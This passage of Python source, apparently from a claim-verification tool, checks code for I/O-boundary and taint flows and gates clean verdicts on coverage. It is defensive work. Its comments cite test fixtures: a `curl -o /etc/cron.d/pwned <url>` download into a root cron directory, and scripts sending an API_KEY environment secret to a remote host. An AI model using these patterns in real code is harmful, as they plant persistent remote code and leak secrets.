def _call_production_coverage(
    raw_edges: list[dict[str, Any]],
    supported_languages: set[str],
    catalogs: dict[str, IoBoundaryCatalog],
) -> BoundaryCoverage:
    """Decide whether the I/O boundary analysis can support a clean verdict.

    Coverage is derived from *call-edge production*, not from
    ``limits.skipped_languages`` (a dead field — WI-nihir) or from the bare
    fact that an analyzer pass ran (``analysis_runs`` records that a pass
    executed, not that it produced the call structure ``io_boundary`` needs).
    A supported language that was analyzed but emitted zero call edges (of
    :data:`_COVERAGE_CALL_EDGE_TYPES`) is *io-blind*: ``io_boundary`` tags I/O
    on call edges, so it saw none of that language's I/O (F69.A1).

    Args:
        raw_edges: Behavior-map edge dicts (``src`` / ``dst`` / ``type`` read).
        supported_languages: Languages present in the repo that have an I/O
            catalog (and could therefore have produced boundary chains).
        catalogs: Loaded I/O catalogs keyed by language. REQUIRED rather than
            defaulted: a safety gate that silently skips its own check when a
            caller forgets an argument fails open, which is the failure mode
            this function exists to prevent.

    Returns:
        ``BoundaryCoverage(complete=False, reason=...)`` when no call edges
        were produced at all, when a supported language produced none, or when
        the analysis called into modules the catalog cannot adjudicate;
        otherwise ``BoundaryCoverage(complete=True)``.
    """
    languages_with_calls: set[str] = set()
    total_call_edges = 0
    for edge in raw_edges:
        etype = edge.get("type", "")
        if etype not in _COVERAGE_CALL_EDGE_TYPES and not is_grpc_rpc_implementation(
            etype, edge.get("meta")
        ):
            continue
        total_call_edges += 1
        src = edge.get("src", "")
        if ":" in src:
            languages_with_calls.add(src.split(":", 1)[0])

    if total_call_edges == 0:
        return BoundaryCoverage(
            complete=False,
            reason=(
                "the analysis produced no call edges at all (empty, "
                "wrong directory, or unanalyzable input), so no I/O could "
                "be detected"
            ),
        )

    # INV-dabov: a language that CALLED into something and has no I/O
    # catalogue at all. Derived here rather than taken as an argument, for the
    # reason the ``catalogs`` docstring already gives: a safety gate a caller
    # can forget to arm fails open, and this one was unarmable — the language
    # never reaches ``supported_languages`` in the first place, because
    # ``cmd_verify_claims`` builds its catalogs dict under
    # ``if catalog.primitives:`` and drops an empty catalogue. The same
    # omission makes ``_uncatalogued_external_modules`` skip it on
    # ``catalog is None``. So the calls were seen, none could be classified,
    # and the verdict was ``confirmed``: reproduced on a 7-line Ruby fixture
    # posting ``ENV['API_KEY']`` to a remote host, rc 0, no disclosure.
    #
    # CALL-SCOPED, NOT REPO-SCOPED, and the distinction is the whole design.
    # Measured over six repos: keyed on languages PRESENT this would name up
    # to 16 apiece — markdown, gitignore, yaml, toml — and downgrade every
    # verdict for a .gitignore. Keyed on languages that emitted CALL EDGES it
    # names one to three real ones (bash on 6/6; +vue on pretix; +csharp,
    # solidity on hypergumbo, both of which are test fixtures). The honest
    # cost is disclosed rather than hidden: `bash` is universal on that
    # cohort, so until an io_primitives/bash.yaml exists this downgrades most
    # real repos to `inconclusive` — which is the correct answer for a tool
    # that cannot see what a shell script does.
    #
    # THIS COMMENT USED TO END "and is why the catalogue is the follow-up
    # rather than a scope exclusion here." That was WRONG, and wrong in the
    # dangerous direction, so it is corrected rather than left standing
    # (INV-larol). ADR-0016's implementation note rules a bash data-I/O
    # catalogue out — cataloguing `curl` as `net_send` attributes curl's
    # network activity to the shell script, and no clean invariant separates
    # `curl` from `git`. Measured on the shipped CLI, a two-line script whose
    # only command is `curl -o /etc/cron.d/pwned <url>`, claim "never writes to
    # the host filesystem": with no bash.yaml, `inconclusive` rc 2; with six
    # lines of `curl -> net_send` bash.yaml, `confirmed` rc 0. The row is
    # correct and the verdict it buys is a green tick over a write into a root
    # cron directory, because classifying a launch used to strip its opacity.
    # `_opaque_launch_sites` now consults the producer stamp, so a launch stays
    # opaque whatever a catalogue says — the follow-up this comment should have
    # named, and the one that makes any bash catalogue safe to consider.
    uncatalogued = sorted(languages_with_calls - set(catalogs))
    if uncatalogued:
        return BoundaryCoverage(
            complete=False,
            reason=(
                # No trailing conclusion: verify_claim appends "; cannot
                # confirm the boundary is unused." to whatever this returns,
                # and the first draft of this string said it too, so the
                # verdict read "...cannot confirm the boundary is unused;
                # cannot confirm the boundary is unused." Every other reason
                # here states only the CAUSE for the same reason.
                f"language(s) {', '.join(uncatalogued)} made calls but have "
                f"no I/O catalog, so none of their I/O could be classified"
            ),
        )

    blind = sorted(supported_languages - languages_with_calls)
    if blind:
        return BoundaryCoverage(
            complete=False,
            reason=(
                f"supported language(s) {', '.join(blind)} were analyzed but "
                f"produced no call edges, so their I/O is invisible to the "
                f"boundary analysis"
            ),
        )

    starved = method_starved_modules(raw_edges, catalogs)
    if starved:
        shown = ", ".join(starved[:_MAX_REPORTED_UNCATALOGUED_MODULES])
        more = len(starved) - _MAX_REPORTED_UNCATALOGUED_MODULES
        suffix = f" (+{more} more)" if more > 0 else ""
        return BoundaryCoverage(
            complete=False,
            reason=(
                f"the analysis calls into {len(starved)} module(s) whose "
                f"catalogued I/O is method-shaped ({shown}{suffix}) but produced "
                f"no method call edge for any of them, so their I/O is "
                f"structurally invisible"
            ),
        )

    # INV-gahuz: control leaves the process for a program whose I/O is not in
    # the edge set. Checked BEFORE the uncatalogued-module list below, and the
    # order is a deliberate courtesy rather than a tie-break: an uncatalogued
    # module is a gap the reader can CLOSE by cataloguing it, while an opaque
    # launch is categorical — no amount of cataloguing makes the launched
    # program visible. Reporting the fixable blocker first would send a reader
    # on an errand that cannot succeed, then move the goalpost on them.
    opaque = _opaque_launch_sites(raw_edges, catalogs)
    unknown = _uncatalogued_external_modules(raw_edges, catalogs)
    if opaque:
        shown = ", ".join(opaque[:_MAX_REPORTED_UNCATALOGUED_MODULES])
        more = len(opaque) - _MAX_REPORTED_UNCATALOGUED_MODULES
        suffix = f" (+{more} more)" if more > 0 else ""
        # DELIBERATELY NOT the "could not classify" wording used below: the
        # catalogue classified these exactly right, and blaming a missing row
        # would send the reader to add one that already exists. State the
        # opacity, which is the actual cause. No trailing conclusion —
        # ``verify_claim`` appends "; cannot confirm the boundary is unused."
        return BoundaryCoverage(
            complete=False,
            reason=(
                f"the analysis launches an external program at "
                f"{len(opaque)} call site(s) ({shown}{suffix}) and cannot see "
                f"what the launched program does, so whether this I/O happens "
                f"there was never examined"
            ),
            opaque_sites=opaque,
            # ``not unknown`` is the whole qualification test: every check
            # above already passed to reach here, so an empty uncatalogued
            # list means these launches are the SOLE remaining blocker and a
            # verdict may be QUALIFIED rather than withheld (ADR-0016 §4).
            # Computed here, beside the evidence, so no caller can forget it.
            qualifying_only=not unknown,
        )

    if unknown:
        shown = ", ".join(unknown[:_MAX_REPORTED_UNCATALOGUED_MODULES])
        more = len(unknown) - _MAX_REPORTED_UNCATALOGUED_MODULES
        suffix = f" (+{more} more)" if more > 0 else ""
        # THE WORDING IS LOAD-BEARING AND THE OLD ONE BECAME FALSE. It said
        # "module(s) with no I/O catalog coverage", which was accurate while the
        # gate was blaming whole modules the catalogue had never heard of. The
        # gate now blames a module for the CALLS it could not classify, and
        # those modules often have extensive coverage — ``os`` carries 40 rows.
        # Measured on a fixture calling ``json.dump(obj, fh)``: the old string
        # printed "no I/O catalog coverage (builtins, json)" directly above
        # "2 fs_write chain(s) found", i.e. found THROUGH those very modules.
        # Naming the calls rather than the modules is also what makes the reason
        # actionable — it says what to catalogue.
        return BoundaryCoverage(
            complete=False,
            reason=(
                f"the analysis makes calls into {len(unknown)} module(s) that "
                f"the I/O catalog could not classify ({shown}{suffix}), so "
                f"whether those calls perform this I/O was never examined"
            ),
        )

    return BoundaryCoverage(complete=True)


def _default_coverage(boundary_map: BoundaryMap) -> BoundaryCoverage:
    """Coverage inferred from the boundary map alone, for direct callers that
    do not supply richer per-language coverage.

    An empty boundary map (no I/O edges at all) is treated as incomplete — a
    must_not_exist claim cannot be confirmed against an analysis that found no
    I/O whatsoever (INV-bitig). A non-empty map is treated as complete; the CLI
    supplies the stricter per-language signal that also catches a partially
    blind analysis (WI-kajil).
    """
    # INV-bitig gate: "did the analysis SEE any I/O at all?" — count BOTH
    # confirmed I/O (total_io_edges, real categories) AND the external_potential
    # bucket. The WI-huhit/WI-foduh headline redefine excludes external_potential
    # from total_io_edges, but external_potential>0 still means the analysis ran
    # and found (receiver-unresolved) calls, so it is NOT an unanalyzed input;
    # this gate keeps the original "any boundary signal" semantics.
    if (
        boundary_map.total_io_edges == 0
        and boundary_map.external_potential_edges == 0
    ):
        return BoundaryCoverage(
            complete=False,
            reason=(
                "the boundary analysis found no I/O edges at all, so a clean "
                "verdict cannot be distinguished from an unanalyzed input"
            ),
        )
    return BoundaryCoverage(complete=True)


def verify_claim(
    claim: Claim,
    boundary_map: BoundaryMap,
    coverage: Optional[BoundaryCoverage] = None,
) -> ClaimVerdict:
    """Verify a boundary claim and stamp the fidelity behind the answer.

    ONE HOME FOR THE STAMP, and the count is the argument: this module builds a
    ``ClaimVerdict`` at fifteen separate return sites, and a field set at each
    of them is a field the sixteenth will not set. WI-lagod exists because a
    verdict could not say which analyzer produced its edges; a fix that
    reintroduces the same omission one branch at a time would be no fix. The
    wrapper is deliberately thin — all the reasoning stays in
    :func:`_verify_claim_uncredited`.
    """
    verdict = _verify_claim_uncredited(claim, boundary_map, coverage)
    if coverage is not None:
        verdict.analysis_fidelity = dict(coverage.analysis_fidelity)
    return verdict


def _verify_claim_uncredited(
    claim: Claim,
    boundary_map: BoundaryMap,
    coverage: Optional[BoundaryCoverage] = None,
) -> ClaimVerdict:
    """Verify a single boundary-constraint claim against a boundary map.

    Args:
        claim: The claim to verify.
        boundary_map: The I/O boundary map to check against.
        coverage: Whether the boundary analysis is trustworthy enough to
            *confirm* a clean (zero-chain / within-limit) verdict. When
            ``None``, coverage is inferred from the map alone
            (:func:`_default_coverage`); the CLI always supplies the stricter
            per-language signal. When coverage is incomplete, a would-be
            ``confirmed`` verdict is downgraded to ``inconclusive`` so the tool
            never asserts a boundary is unused on an analysis that couldn't see
            it (WI-kajil / INV-bitig P0). Coverage never affects ``violated``
            verdicts: found evidence is positive regardless of blind spots.

    Returns:
        ClaimVerdict with the result.
    """
    if coverage is None:
        coverage = _default_coverage(boundary_map)

    entry = boundary_map.entries.get(claim.constraint_boundary)
    chain_count = len(entry.chains) if entry else 0

    # INV-fibis. Read ONCE, here, and consumed only on the clean paths below. A
    # ``violated`` verdict must not acquire it: finding evidence is trustworthy
    # regardless of what else went unadjudicated, and the whole discipline of
    # this module is that coverage gates the ALL-CLEAR and nothing else.
    #
    # SCOPED BY THE CLAIM'S OWN BOUNDARY, which is what keeps an unrelated dict
    # ``.get`` out of a ``net_send`` verdict — the mis-fire the 2026-08-11
    # measurement caught, and the reason the unscoped DOWNGRADE was refused.
    untyped = coverage.untyped_receiver_sites.get(claim.constraint_boundary) or []
    _scope_sites, _scope_total, _scope_names = coverage.unknown_receiver_scope

    def _clean_caveats(
        base: list[dict[str, Any]] | None = None,
    ) -> list[dict[str, Any]]:
        """Every disclosure a CLEAN verdict on this claim owes its reader.

        ONE BUILDER, FOUR CLEAN PATHS. ``must_not_exist`` reaches a clean
        verdict twice (opaque-qualified and fully clean) and ``max_chains``
        twice more, and each used to construct its own caveat list. That is the
        two-homes-for-one-fact shape this module has paid for repeatedly: the
        INV-fibis scope disclosure would have had to be added in four places,
        and the one that RUNS is not always the one a later reader edits.
        """
        out = list(base or [])
        if untyped:
            out = _merge_caveat(
                out,
                _untyped_receiver_caveat(claim.constraint_boundary, untyped),
            )
        if _scope_sites:
            out = _merge_caveat(
                out,
                _unknown_receiver_scope_caveat(
                    _scope_sites, _scope_total, _scope_names,
                ),
            )
        if coverage.method_call_blind_languages:
            out = _merge_caveat(
                out,
                _analyzer_method_call_blind_caveat(
                    coverage.method_call_blind_languages,
                ),
            )
        if coverage.suppressed_sink_methods:
            out = _merge_caveat(
                out,
                _analyzer_suppressed_methods_caveat(
                    coverage.suppressed_sink_methods,
                ),
            )
        if coverage.higher_fidelity_available:
            out = _merge_caveat(
                out,
                _higher_fidelity_caveat(coverage.higher_fidelity_available),
            )
        return out

    # Check must_not_exist constraint
    if claim.constraint_must_not_exist:
        if chain_count == 0:
            # ADR-0016 §4: opacity QUALIFIES a clean verdict, it does not
            # withhold one — but only when the launches are the sole blocker.
            # Anything else incomplete is genuine blindness and still yields
            # ``inconclusive``, because a reader cannot tell which gap the
            # silence came from.
            if not coverage.complete and coverage.qualifying_only:
                # BOTH KINDS RIDE ONE VERDICT. A repo can launch a program AND
                # call through an untyped receiver, and _merge_caveat is the
                # constructor that exists because a second writer overwriting
                # the first is this module's documented failure (INV-virat).
                caveats = _clean_caveats(
                    [_opaque_boundary_caveat(coverage.opaque_sites)],
                )
                return ClaimVerdict(
                    claim_id=claim.id,
                    claim_text=claim.text,
                    verdict="confirmed_with_caveats",
                    details=(
                        f"No {claim.constraint_boundary} chains found in code "
                        f"the analysis could see."
                    ),
                    caveats=caveats,
                )
            if not coverage.complete:
                return ClaimVerdict(
                    claim_id=claim.id,
                    claim_text=claim.text,
                    verdict="inconclusive",
                    details=(
                        f"No {claim.constraint_boundary} chains found, but "
                        f"{coverage.reason}; cannot confirm the boundary is "
                        f"unused."
                    ),
                )
            caveats = _clean_caveats()
            if caveats:
                return ClaimVerdict(
                    claim_id=claim.id,
                    claim_text=claim.text,
                    verdict="confirmed_with_caveats",
                    details=(
                        f"No {claim.constraint_boundary} chains found in code "
                        f"the analysis could adjudicate."
                    ),
                    caveats=caveats,
                )
            return ClaimVerdict(
                claim_id=claim.id,
                claim_text=claim.text,
                verdict="confirmed",
                details=f"No {claim.constraint_boundary} chains found.",
            )
        return ClaimVerdict(
            claim_id=claim.id,
            claim_text=claim.text,
            verdict="violated",
            evidence_count=chain_count,
            details=(
                f"{chain_count} {claim.constraint_boundary} chain(s) found, "
                f"but claim requires none."
            ),
        )

    # Check max_chains constraint
    if claim.constraint_max_chains is not None:
        if chain_count <= claim.constraint_max_chains:
            if not coverage.complete:
                return ClaimVerdict(
                    claim_id=claim.id,
                    claim_text=claim.text,
                    verdict="inconclusive",
                    details=(
                        f"{chain_count} {claim.constraint_boundary} chain(s) "
                        f"found, within limit of {claim.constraint_max_chains}, "
                        f"but {coverage.reason}; cannot confirm the limit holds."
                    ),
                )
            details = (
                f"{chain_count} {claim.constraint_boundary} chain(s) found, "
                f"within limit of {claim.constraint_max_chains}."
            )
            # THE SAME ASSERTION ABOUT ABSENCE, one chain-count over: "within
            # limit" says no FURTHER chains exist, which rests on exactly the
            # completeness ``must_not_exist`` rests on. ``BoundaryCoverage``'s
            # docstring already treats the two together, and gating one while
            # leaving the other silent is the two-homes-for-one-fact defect
            # (L8) written into a single function.
            caveats = _clean_caveats()
            if caveats:
                return ClaimVerdict(
                    claim_id=claim.id,
                    claim_text=claim.text,
                    verdict="confirmed_with_caveats",
                    details=details,
                    caveats=caveats,
                )
            return ClaimVerdict(
                claim_id=claim.id,
                claim_text=claim.text,
                verdict="confirmed",
                details=details,
            )
        return ClaimVerdict(
            claim_id=claim.id,
            claim_text=claim.text,
            verdict="violated",
            evidence_count=chain_count,
            details=(
                f"{chain_count} {claim.constraint_boundary} chain(s) found, "
                f"exceeds limit of {claim.constraint_max_chains}."
            ),
        )

    # No constraint matched — inconclusive (ADR-0033 Phase 3 PR4 /
    # WI-rolol sub-task A). Previously fell through to verdict="confirmed"
    # with details="No constraint to check.", silently confirming claims
    # that had no machinery to verify them (INV-bitig P0).
    return ClaimVerdict(
        claim_id=claim.id,
        claim_text=claim.text,
        verdict="inconclusive",
        details=(
            "No machine-checkable constraint on this claim. The claim "
            "may be true, but verify-claims has nothing to assert against."
        ),
    )


def _flow_identity(v: "TaintFlowFinding") -> tuple[Any, ...]:
    """Full per-flow identity of a taint finding (WI-kikis).

    Two findings are "the same flow" iff their source/sink symbols, primitive
    names, and call-graph path all match — so verbatim-duplicate findings
    collapse while flows that merely share a primitive NAME (distinct symbols)
    stay distinct.

    Keyed on the SET fields rather than the witness scalars (INV-karud): after
    the propagator's situation collapse a finding's claim is its primitive
    sets, and two situations can share a witness scalar while claiming
    different sets. The scalars would make those one row.
    """
    return (
        v.source_primitives,
        v.source_symbol,
        v.sink_primitives,
        v.sink_symbols,
        tuple(v.path),
    )


#: How many primitive names one rendered row spells out before switching to a
#: count. A situation on a large symbol can name dozens (caddy's ``cmdRun``
#: alone spans 32 pairs on one claim), and a prose row that long is not read.
#: The full sets are always in the structured ``evidence`` row.
_MAX_RENDERED_PRIMITIVES = 3


def _render_primitives(names: "tuple[str, ...]") -> str:
    """Comma-joined primitive names, capped with an explicit remainder."""
    if len(names) <= _MAX_RENDERED_PRIMITIVES:
        return ", ".join(names)
    shown = ", ".join(names[:_MAX_RENDERED_PRIMITIVES])
    return f"{shown} (+{len(names) - _MAX_RENDERED_PRIMITIVES} more)"


def _render_flow(v: "TaintFlowFinding") -> str:
    """Render one violating flow with its drill-down identity (WI-kikis):
    ``<source_primitives> [<source_symbol>] -> <sink_primitives> [<sink>]``
    plus a hop count when the path routes through intermediate nodes.

    Renders the SETS, not the witness scalars (INV-karud). An unadjudicated
    finding stands for every pair between them, and printing one pair would
    name a data dependence the analysis never established while hiding the
    others. Names are module-qualified for the same reason the record carries
    them that way: ``Do`` is not checkable against a catalogue,
    ``net/http.Client.Do`` is.
    """
    row = (
        f"{_render_primitives(v.source_primitives)} [{v.source_symbol}] -> "
        f"{_render_primitives(v.sink_primitives)}"
    )
    if len(v.sink_symbols) == 1:
        row += f" [{v.sink_symbols[0]}]"
    else:
        row += f" [{len(v.sink_symbols)} sink symbol(s)]"
    # path = [source, ...intermediate..., sink]; hops are the interior nodes.
    if len(v.path) > 2:
        row += f" via {len(v.path) - 2} hop(s)"
    return row


def _flow_evidence_dict(v: "TaintFlowFinding") -> dict[str, Any]:
    """Structured per-flow drill-down record for the verdict ``evidence`` list
    (WI-kikis) — the machine-readable counterpart of :func:`_render_flow`."""
    return {
        "source_symbol": v.source_symbol,
        "source_primitive": v.source_primitive,
        "source_module": v.source_module,
        "source_boundary": v.source_boundary,
        "sink_symbol": v.sink_symbol,
        "sink_primitive": v.sink_primitive,
        # WI-joruv: the MODULE the matched catalog entry declares, which is
        # frequently not recoverable from ``sink_symbol``. A Go sink emits
        # ``go:net/http:0-0:Do:external_symbol`` (package) while the catalog
        # entry is ``net/http.Client.Do`` (package.Type). Emitting only the
        # symbol leaves a *correct* match unverifiable — a reader cannot tell
        # it from a short-name collision without re-running the matcher,
        # which is precisely the "realizable by lookup" property INV-karud
        # asks for. Pure provenance: this changes no match.
        "sink_module": v.sink_module,
        "path": list(v.path),
        # INV-karud (c): HOW this flow was adjudicated. Both fields existed on
        # the finding and neither reached the record, so a reader could not
        # tell a flow the ADR-0017 §3a walk confirmed by data dependence from
        # one included by call reachability alone — and the whole point of a
        # `precise` label is that a consumer can act on it differently. This is
        # the same "the pipeline computed it and then discarded it" shape that
        # `source_module` (WI-joruv) and `source_boundary` (WI-vazal) closed on
        # this very record.
        "confidence": v.confidence,
        "analysis_method": v.analysis_method,
        # INV-zidur: WHAT THE WALK RETURNED, beside which analysis ran.
        # ``analysis_method == "ddg_mixed"`` is three different outcomes —
        # the walk refuted, the walk escaped, or the walk never ran because a
        # guard above it was not met — and a consumer cannot tell
        # removal-on-knowledge from removal-on-ignorance without this. It is
        # the field ADR-0017 §7a's addressable domain has to be priced on;
        # pricing it on ``analysis_method`` is what made WI-kabif's own
        # tripwire fire.
        "walk_verdict": v.walk_verdict,
        # INV-zidur: for ``not_attempted``, the FIRST guard that stopped the
        # walk. Reported because "the walk never ran" is not actionable on its
        # own and "which guard" is exactly what prices a remedy.
        "walk_blocked_by": v.walk_blocked_by,
        # INV-karud: what this record actually claims. The scalars above are
        # the witness the `path` belongs to; these are the sets the finding
        # stands for, module-qualified so each is checkable by catalogue
        # lookup (clause a1). `collapsed_flow_count` keeps the pair count
        # reachable — the situation count replaces it in the prose, and a
        # consumer that wants the old quantity must not have to re-derive it.
        "source_primitives": list(v.source_primitives),
        "sink_primitives": list(v.sink_primitives),
        "sink_symbols": list(v.sink_symbols),
        "collapsed_flow_count": v.collapsed_flow_count,
    }


#: Disclosure-bucket keys for flows excluded from a claim verdict (WI-bifob).
#:
#: ``SOURCE_SCOPE_TEST`` is no longer the only test-side bucket. ``is_test_file``
#: is deliberately BROAD — it also matches ``bench/``, ``fixtures/``,
#: ``testdata/``, ``mocks/``, ``harnesses/`` and ``fv/`` — and reporting all of
#: that as ``test_sourced`` told the reader something false about, say, a
#: benchmark directory. The owner ruling (2026-08-03) was to KEEP the breadth
#: and DISCLOSE which rule fired, so the bucket key now carries the reason
#: ``paths.classify_test_file`` returned. ``test_sourced`` keeps its exact
#: former meaning for genuine test code, so a consumer keyed on it does not
#: silently lose the case it cared about — it stops being credited with the
#: others.
SOURCE_SCOPE_PRODUCTION = "production"
SOURCE_SCOPE_TEST = "test_sourced"
SOURCE_SCOPE_MIGRATION = "migration_sourced"


def _symbol_path_slot(symbol_id: str) -> str:
    """Extract the path slot from ``{lang}:{path}:{span}:{name}:{kind}``.

    RIGHT-ANCHORED deliberately. Per ADR-0036 (D1a) the path slot is the one
    colon-TOLERANT slot in the grammar — ``dart:dart:io:0-0:module:module`` has
    path ``dart:io`` — while lang/span/name/kind are colon-free.

    THE FOLD THIS DOCSTRING ASKED FOR HAS HAPPENED. It used to read "not
    folding those two here, but this must not become a third naive copy",
    naming ``ir._extract_path_slot``'s ``parts[1]`` as wrong — and a FOURTH
    copy was already live in ``taint._extract_callee_module``, where it
    truncated every colon-bearing Rust module and made the taint matcher reject
    correctly-identified sinks. All four now delegate to
    :func:`ir.symbol_path_slot`.

    Returns the empty string for anything that is not a well-formed id, which
    the callers treat as "not test, not migration" — an unparseable source is
    not evidence for excluding a flow.
    """
    return symbol_path_slot(symbol_id)


def _credited_sanitizers(
    findings: list["TaintFlowFinding"],
) -> tuple[list[str], set[str]]:
    """Which sanitizers the barrier credited, and which of them a user supplied.

    ONE HOME FOR ONE FACT. Two surfaces are built from this — the attribution
    string a human reads (:func:`_sanitizer_attribution`) and the caveat a
    machine branches on (:data:`CAVEAT_USER_SUPPLIED_SANITIZER`) — and deriving
    it twice is how they come to disagree about whether the same run rested on
    a repo-supplied entry. ``test_prose_and_verdict_value_cannot_disagree``
    asserts the two move together in both directions.

    Returns ``(named, repo_supplied)``: every credited sanitizer in first-seen
    order, and the subset that came from a user catalogue path. Order is
    preserved rather than sorted because the rendered clause reads as a list of
    candidates and a stable order makes verdict text diffable across runs.

    WHAT ``repo_supplied`` NON-EMPTY DOES AND DOES NOT ESTABLISH. It says a
    user-supplied entry was among the sanitizers credited on some flow the
    verdict rests on. It does NOT prove that entry was strictly necessary: a
    flow can credit a shipped sanitizer AND a user-supplied one, in which case
    removing the user entry might leave the flow sanitized anyway. Reporting a
    caveat there is the conservative direction on a security surface, and it is
    named here rather than hidden behind the word "load-bearing" — the exact
    counterfactual would require re-running propagation without the user layer,
    which is a much larger change than this and is not what shipped.
    """
    named: list[str] = []
    repo_supplied: set[str] = set()
    for finding in findings:
        if not getattr(finding, "sanitized", False):
            # UNREACHABLE FROM TODAY'S ONLY CALLER, and kept anyway. The clause
            # this feeds is built only on the ``confirmed`` path, where every
            # constrained flow is sanitized by construction (an unsanitized one
            # would have made the verdict ``violated``). It is kept rather than
            # deleted because the failure it prevents is a WRONG SAFETY
            # STATEMENT — attributing a protection to a flow that reached the
            # sink unprotected — and the caller's guarantee is incidental to
            # this function rather than expressed in its signature.
            continue  # pragma: no cover
        for name in getattr(finding, "sanitized_by", ()) or ():
            if name not in named:
                named.append(name)
        repo_supplied.update(getattr(finding, "sanitized_by_user_supplied", ()) or ())
    return named, repo_supplied


def _sanitizer_attribution(findings: list["TaintFlowFinding"]) -> str:
    """Name the sanitizers holding a clean verdict up, marking repo-supplied ones.

    INV-pojib. The clause this feeds used to be built from the sanitized-flow
    COUNT alone, so "a sanitizer protects every route" read identically whether
    the sanitizer was ``cryptography.fernet.Fernet.encrypt`` from the shipped
    catalogue or a no-op function the ANALYSED REPOSITORY declared about itself.
    Measured on the shipped CLI: an 11-line fixture doing
    ``os.remove(launder(os.environ["API_KEY"]))``, where ``launder`` returns its
    argument unchanged, went ``violated`` rc 1 -> ``confirmed`` rc 0 on the
    strength of an 8-line sanitizer file, with the same sentence and the same
    exit code as an earned clean verdict.

    WHY MARKING ONLY THE REPO-SUPPLIED ONES IS THE POINT. A caveat printed on
    every sanitized verdict would carry no information, and a reader learns to
    discount a caveat that is always there — which is the failure this is meant
    to correct rather than a milder form of it. So the built-in case is named
    and NOT marked, and the discriminator test pins that.

    THIS DOES NOT CHANGE A VERDICT. It changes what a verdict SAYS. Whether the
    exit code should also carry it is a separate, larger question (a consumer
    contract), tracked on the item rather than decided here.
    """
    named, repo_supplied = _credited_sanitizers(findings)
    if not named:
        # A sanitized flow whose sanitizer was not recorded. Say nothing rather
        # than guess: the propagators populate this, and a flow constructed by
        # a consumer that does not is better served by the unattributed clause
        # than by a claim about a sanitizer nobody named.
        return ""
    shown = ", ".join(
        f"{name} (project-local)" if name in repo_supplied else name
        for name in named
    )
    # "via X" WHEN ONE CANDIDATE, "one of" WHEN SEVERAL, because the barrier
    # records which sanitizers COULD have fired, not which did. All four shipped
    # ``*.encrypt`` entries match a bare ``encrypt`` callee, so a fixture calling
    # ``Fernet.encrypt`` has four candidates and naming one would be a fact the
    # analysis never established — the first draft of this did exactly that and
    # printed ``ChaCha20Poly1305.encrypt`` for a Fernet call, caught by running
    # the live discriminator rather than the unit tests, which were green.
    if len(named) == 1:
        return f" (via {shown})"
    return f" (barrier matched one of: {shown})"


def _source_scope(finding: "TaintFlowFinding") -> str:
    """Classify a flow by whether its SOURCE is production code.

    The SOURCE side is what is classified, not the sink. A test that reaches a
    real network primitive is still a test doing its job; a production function
    that reaches a primitive inside a test helper is still a production flow.
    The question the claim asks is "does the shipped application do this", and
    that is decided by where the data enters.
    """
    return symbol_source_scope(getattr(finding, "source_symbol", "") or "")


def symbol_source_scope(symbol_id: str) -> str:
    """Classify a SYMBOL ID by whether it is production code.

    Split out of :func:`_source_scope` when the taint LANGUAGE CENSUS needed
    the same answer (INV-dabuf). The census lives in ``cli`` and had no
    production question at all, so a single fixture file in a language with no
    taint catalogue blocked every claim in the repo while a taint FLOW out of
    that same file was excluded as non-production. One tool, two answers about
    whether a fixture counts — and the fix is to share the classifier, not to
    write a second one next to the census (L53: a second home for one fact
    drifts immediately).
    """
    path = _symbol_path_slot(symbol_id)
    if not path:
        return SOURCE_SCOPE_PRODUCTION
    # ``classify_test_file`` IS ``is_test_file`` — the boolean is defined as
    # "reason is not None" — so asking for the reason changes which flows are
    # excluded not at all. It changes only what the disclosure is allowed to
    # call them. Re-deriving the categories here instead would put a second
    # copy of a production classification in a consumer (L53).
    reason = classify_test_file(path)
    if reason is not None:
        return f"{reason}_sourced"
    if is_migration_file(path):
        return SOURCE_SCOPE_MIGRATION
    return SOURCE_SCOPE_PRODUCTION


def _displaced_shipped_entries(
    tf: "TaintFlowConstraint",
    displaced_sinks: Mapping[str, Sequence[Any]] | None,
    displaced_sources: Mapping[str, Sequence[Any]] | None,
) -> list[str]:
    """Shipped entries a user row replaced that could have decided THIS claim.

    The zone/label equality test is what keeps this a qualified opinion rather
    than noise: a displaced sink whose shipped zone is some OTHER zone could
    not have produced evidence for this claim, and a user row that moves a sink
    INTO the prohibited zone adds findings rather than removing them.
    """
    hits: list[str] = []
    for lang, entries in (displaced_sinks or {}).items():
        for e in entries:
            if getattr(e, "zone", None) == tf.prohibited_sink_zone:
                hits.append(f"{lang}:{e.module}.{e.name} [sink/{e.zone}]")
    for lang, entries in (displaced_sources or {}).items():
        for e in entries:
            if getattr(e, "taint_label", None) == tf.source_taint:
                hits.append(
                    f"{lang}:{e.module}.{e.name} [source/{e.taint_label}]"
                )
    return sorted(set(hits))


def verify_taint_claim(
    claim: Claim,
    findings: list[Any],
    include_non_production: bool = False,
    *,
    displaced_sinks: Mapping[str, Sequence[Any]] | None = None,
    displaced_sources: Mapping[str, Sequence[Any]] | None = None,
    coverage: Optional[BoundaryCoverage] = None,
) -> ClaimVerdict:
    """Verify a taint claim and stamp the fidelity behind the answer.

    The taint arm gets the same wrapper as the boundary arm for the reason
    INV-nuhun exists: a run that credits its fidelity on one arm and stays
    silent on the other is the asymmetry that item names.
    """
    verdict = _verify_taint_claim_uncredited(
        claim, findings, include_non_production,
        displaced_sinks=displaced_sinks,
        displaced_sources=displaced_sources,
        coverage=coverage,
    )
    if coverage is not None:
        verdict.analysis_fidelity = dict(coverage.analysis_fidelity)
    return verdict


def _verify_taint_claim_uncredited(
    claim: Claim,
    findings: list[Any],
    include_non_production: bool = False,
    *,
    displaced_sinks: Mapping[str, Sequence[Any]] | None = None,
    displaced_sources: Mapping[str, Sequence[Any]] | None = None,
    coverage: Optional[BoundaryCoverage] = None,
) -> ClaimVerdict:
    """Verify a single taint-flow claim against propagation findings.

    Checks whether any TaintFlowFinding matches the claim's constraint:
    the source taint label flows to the prohibited sink zone without
    being sanitized.

    Args:
        claim: The claim with a taint_flow constraint.
        findings: List of TaintFlowFinding objects from propagation.
        include_non_production: Count flows whose SOURCE is test, fixture or
            migration code against the claim. Default False (WI-bifob): those
            flows are excluded from the verdict and disclosed in the verdict's
            ``excluded_flows`` bucket instead. Set True to restore the previous
            behavior of treating every source as in scope.
        coverage: Boundary-analysis coverage, read ONLY on the clean path and
            ONLY for its untyped-receiver disclosures (INV-nuhun). This
            parameter is why the docstring on :func:`verify_claims` no longer
            says taint claims are unaffected by coverage: they were, and the
            consequence was that one invocation disclosed ``sendall`` on a
            ``net_send`` boundary claim and certified "no unsanitized
            host_secret data reaches network zone" two lines later, about the
            same call. Optional, and its absence adds no disclosure — a
            verdict must never invent one.

    Returns:
